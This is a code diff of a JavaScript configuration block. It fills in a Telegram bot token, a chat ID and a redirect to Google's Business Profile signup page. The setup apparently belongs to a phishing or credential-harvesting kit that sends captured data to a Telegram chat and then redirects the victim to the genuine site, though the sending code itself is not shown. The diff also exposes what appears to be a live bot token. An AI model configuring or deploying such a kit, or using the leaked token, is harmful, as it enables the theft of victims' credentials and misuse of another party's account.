@@ -2,8 +2,8 @@
 // ✏️ EDIT THESE VALUES WITH YOUR OWN
 // ============================================================
 
-const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';          // e.g. '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'
-const CHAT_ID = 'YOUR_CHAT_ID_HERE';              // e.g. '123456789' (or '@channelusername')
+const BOT_TOKEN = '8663822973:AAFMUT0hR_Rgo3tSR0stWcjCZugz31zbkAQ';          // e.g. '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'
+const CHAT_ID = '-5595613546';              // e.g. '123456789' (or '@channelusername')
 const REDIRECT_URL = 'https://business.google.com/create/new?hl=en&gmbsrc=ng-en-z-z-z-gmb-l-z-d~mhp-hom_sig-u&original_intent=GMB&skiplp=1&_gl=1*we7dbu*_ga*MTQyMzU2Nzk4MS4xNzQ4ODg2MDg1*_ga_VM5ES1YN10*czE3NDg4ODYwODQkbzEkZzAkdDE3NDg4ODYwODQkajYwJGwwJGgw&service=ome&omec=EMLX0y4yAgECOipnbWJzcmM9bmctZW4tei16LXotZ21iLWwtei1kfm1ocC1ob21fc2lnLXVAAUoTCIuXmb2k040DFb-XAAAd3Ss8Mw%3D%3D';
 
 // ============================================================
